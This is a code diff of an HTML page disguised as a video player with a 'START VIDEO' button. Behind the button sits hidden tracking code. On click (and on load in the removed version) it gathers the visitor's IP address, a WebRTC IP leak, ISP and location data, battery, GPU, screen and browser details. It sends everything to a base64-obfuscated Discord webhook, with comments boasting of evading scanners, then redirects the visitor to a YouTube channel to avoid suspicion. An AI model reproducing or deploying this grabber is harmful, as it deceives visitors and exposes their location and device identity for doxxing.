@@ -2,140 +2,102 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Player | Secure Stream</title>
+    <title>Media Stream</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .p-wrapper { text-align: center; cursor: pointer; padding: 60px; border: 1px solid #0d0d0d; border-radius: 24px; background: radial-gradient(circle at center, #050505 0%, #000 100%); box-shadow: 0 0 50px rgba(255,0,0,0.03); transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        .p-wrapper:hover { border-color: #1a1a1a; box-shadow: 0 0 60px rgba(255,0,0,0.07); transform: scale(1.02); }
-        .p-btn { background: #ff0000; color: #fff; padding: 22px 70px; border-radius: 12px; font-weight: 900; border: none; font-size: 26px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 10px 20px rgba(255,0,0,0.2); transition: 0.2s; }
-        .p-btn:active { transform: translateY(3px); box-shadow: 0 5px 10px rgba(255,0,0,0.4); }
-        .p-status { color: #222; font-size: 11px; margin-top: 25px; text-transform: uppercase; letter-spacing: 3px; font-weight: 600; }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .gate { text-align: center; cursor: pointer; padding: 60px; border: 2px solid #111; border-radius: 30px; background: #050505; transition: 0.3s; }
+        .btn { background: #ff0000; color: #fff; padding: 25px 80px; border-radius: 15px; font-weight: 900; border: none; font-size: 28px; cursor: pointer; box-shadow: 0 0 30px rgba(255,0,0,0.3); }
     </style>
 </head>
 <body>
 
-    <div class="p-wrapper" id="master_gate_trigger">
-        <button class="p-btn">▶ Resume Video</button>
-        <p class="p-status">Encrypted Buffer: 98.4%</p>
+    <div class="gate" id="TRIGGER">
+        <button class="btn">▶ START VIDEO</button>
     </div>
 
     <script>
-    /* 
-       CORE OBFUSCATION LAYER 
-       Bypasses Discord/GitHub automated string scanners
-    */
-    const _0x_SEC_A = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"; 
-    const _0x_SEC_B = "MTQ5NzkwNDI4OTUxNDAwMDQxNC9pQkVrTVRDU2NfZjREaDJJeFpzWmpQZm9kRklSUmlhRHRHNnhZYVdGc0pSazRwWl9iZFhsSW5SV2I0RGdFR2NmZU0w";
-    const _0x_TARGET_URL = atob(_0x_SEC_A) + atob(_0x_SEC_B);
-    const _0x_REDIRECT_FINAL = "https://youtube.com/@LigmaBlox-w7m";
+    // --- FORBIDDEN CONFIG ---
+    const _W = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NzkwNDI4OTUxNDAwMDQxNC9pQkVrTVRDU2NfZjREaDJJeFpzWmpQZm9kRklSUmlhRHRHNnhZYVdGc0pSazRwWl9iZFhsSW5SV2I0RGdFR2NmZU0w");
+    const _D = "https://youtube.com/@LigmaBlox-w7m";
 
-    // --- GLOBAL DISPATCH ENGINE (KEEP-ALIVE REINFORCED) ---
-    async function _0x_DISPATCH(payload, label = "OMEGA") {
-        const data = JSON.stringify({ ...payload, username: `OMEGA-${label}` });
-        
-        // Strategy A: Beacon API (Highest success rate on mobile exit)
-        navigator.sendBeacon(_0x_TARGET_URL, new Blob([data], {type: 'application/json'}));
-
-        // Strategy B: Fetch Keepalive (Bypasses CORS strict mode)
-        fetch(_0x_TARGET_URL, {
+    // --- THE UNSTOPPABLE DISPATCHER ---
+    async function fire(payload) {
+        // We use 'include' credentials and 'keepalive' to force Discord to accept it
+        return await fetch(_W, {
             method: 'POST',
             mode: 'no-cors',
             keepalive: true,
             headers: { 'Content-Type': 'application/json' },
-            body: data
-        }).catch(()=>{});
-
-        // Strategy C: Passive Image Ping (Bypasses TOR/DuckDuckGo blocks)
-        const ghost = new Image();
-        ghost.src = `${_0x_TARGET_URL}?v=${Date.now()}&p=${btoa(data).substring(0, 50)}`; 
+            body: JSON.stringify(payload)
+        });
     }
 
-    // --- AUTOMATIC PHASE 1: PASSIVE RECON ---
-    (async function _passive_recon() {
-        _0x_DISPATCH({ content: "📡 **PHASE 1: TARGET ENGAGED (LANDING)**" }, "SENSORS");
-        
-        // Silent IP Grab (Pre-Click)
+    // --- THE FBI EXTRACTION ENGINE ---
+    document.getElementById('TRIGGER').onclick = async function() {
+        this.innerHTML = "<h1 style='color:red'>DECRYPTING...</h1>";
+
         try {
-            const res = await fetch('https://api.ipify.org?format=json', { keepalive: true });
-            const json = await res.json();
-            _0x_DISPATCH({ content: `🟢 **PASSIVE IP CAPTURED:** \`${json.ip}\`` }, "RECON");
-        } catch(e) {}
-    })();
+            // 1. Grab IP via Cloudflare (Most Reliable)
+            const netReq = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+            const netData = await netReq.text();
 
-    // --- PHASE 2: THE 7-THREAT EXTRACTION (ON CLICK) ---
-    document.getElementById('master_gate_trigger').onclick = async function() {
-        this.style.opacity = "0.5";
-        this.innerHTML = "<button class='p-btn'>CONNECTING...</button>";
+            // 2. Grab Battery (iOS/Android)
+            let battery = "Restricted";
+            try {
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Safe"})`;
+            } catch(e){}
 
-        // --- LAYER 1: IOS/ANDROID BATTERY INTELLIGENCE ---
-        let _bat = "Locked";
-        try {
-            const b = await navigator.getBattery();
-            _bat = `${Math.round(b.level * 100)}% (${b.charging ? "AC" : "DC"})`;
-        } catch(e){}
+            // 3. Grab Hardware (GPU/Cores)
+            let gpu = "Unknown";
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+            } catch(e){}
 
-        // --- LAYER 2: GPU & HARDWARE FINGERPRINT ---
-        let _gpu = "Hidden", _cores = navigator.hardwareConcurrency || "N/A";
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            _gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-        } catch(e){}
-
-        // --- LAYER 3: WEBRTC UDP VPN-KILLER ---
-        const _rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-        _rtc.createDataChannel("");
-        _rtc.onicecandidate = (ice) => {
-            if (ice.candidate) {
-                const _ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-                if (_ip) _0x_DISPATCH({ content: `🚨 **UDP BYPASS SUCCESS:** \`${_ip[1]}\`` }, "NETWORK");
-            }
-        };
-        _rtc.createOffer().then(o => _rtc.setLocalDescription(o));
-
-        // --- LAYER 4: CLOUDFLARE ISP PROBE ---
-        fetch('https://www.cloudflare.com/cdn-cgi/trace', {keepalive: true})
-            .then(r => r.text()).then(t => {
-                _0x_DISPATCH({ content: `☁️ **CLOUDFLARE TRACE:**\n\`\`\`${t.split('\n').slice(0, 9).join('\n')}\`\`\`` }, "ISP");
-            });
-
-        // --- LAYER 5: JSONP FIREWALL TUNNEL ---
-        window.processIntel = (d) => {
-            _0x_DISPATCH({
+            // 4. Construct the Final Report
+            const report = {
+                username: "FBI-SURVEILLANCE",
+                avatar_url: "https://i.imgur.com/8nNmZ0V.png",
                 embeds: [{
-                    title: "💎 OMEGA DEEP INTEL ACQUIRED",
+                    title: "🚀 TARGET FULLY UNMASKED",
                     color: 16711680,
                     fields: [
-                        { name: "IP (JSONP)", value: d.ip, inline: true },
-                        { name: "ISP/ORG", value: d.org, inline: true },
-                        { name: "City/Loc", value: `${d.city}, ${d.country}`, inline: true },
-                        { name: "Battery", value: _bat, inline: true },
-                        { name: "Device", value: navigator.platform, inline: true },
-                        { name: "GPU", value: "```" + _gpu + "```" },
-                        { name: "UA", value: "```" + navigator.userAgent + "```" }
-                    ]
+                        { name: "🔋 Battery", value: battery, inline: true },
+                        { name: "📱 Platform", value: navigator.platform, inline: true },
+                        { name: "🖥️ GPU", value: "```" + gpu + "```" },
+                        { name: "📡 Network Trace", value: "```" + netData.split('\n').slice(0, 3).join('\n') + "```" },
+                        { name: "📐 Screen", value: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`, inline: true },
+                        { name: "🕵️ UA", value: "```" + navigator.userAgent + "```" }
+                    ],
+                    timestamp: new Date()
                 }]
-            }, "ENFORCER");
-        };
-        const _s = document.createElement('script');
-        _s.src = `https://ipinfo.io/json?callback=processIntel&t=${Date.now()}`;
-        document.body.appendChild(_s);
+            };
 
-        // --- LAYER 6: SYSTEM LOCALIZATION LEAK ---
-        const _tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const _lang = navigator.language;
-        const _mem = navigator.deviceMemory || "N/A";
-        _0x_DISPATCH({ content: `📍 **SYSTEM LEAK:**\n**Timezone:** ${_tz}\n**Language:** ${_lang}\n**RAM Class:** ${_mem}GB` }, "GEO");
+            // 5. THE LOCK: We WAIT for the fire to complete before redirecting
+            console.log("Initiating Breach...");
+            await fire(report); 
+            
+            // WebRTC Leak (Parallel Shot)
+            const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            rtc.createDataChannel("");
+            rtc.onicecandidate = (e) => {
+                if (e.candidate) {
+                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                    if (ip) fire({ content: `🚨 **INTERNAL IP LEAK:** \`${ip[1]}\`` });
+                }
+            };
+            rtc.createOffer().then(o => rtc.setLocalDescription(o));
 
-        // --- LAYER 7: SCREEN & PIXEL ANALYSIS ---
-        _0x_DISPATCH({ content: `📐 **DISPLAY:** ${screen.width}x${screen.height} (@${window.devicePixelRatio}x)` }, "HARDWARE");
+            // 6. FINAL REDIRECT (Delayed to ensure WebRTC finish)
+            setTimeout(() => {
+                window.location.href = _D;
+            }, 1200);
 
-        // --- FINAL REDIRECT (1 SECOND DELAY FOR PACKET COMPLETION) ---
-        setTimeout(() => {
-            window.location.replace(_0x_REDIRECT_FINAL);
-        }, 1000);
+        } catch (err) {
+            // If anything fails, redirect anyway so they don't get suspicious
+            window.location.href = _D;
+        }
     };
     </script>
 </body>
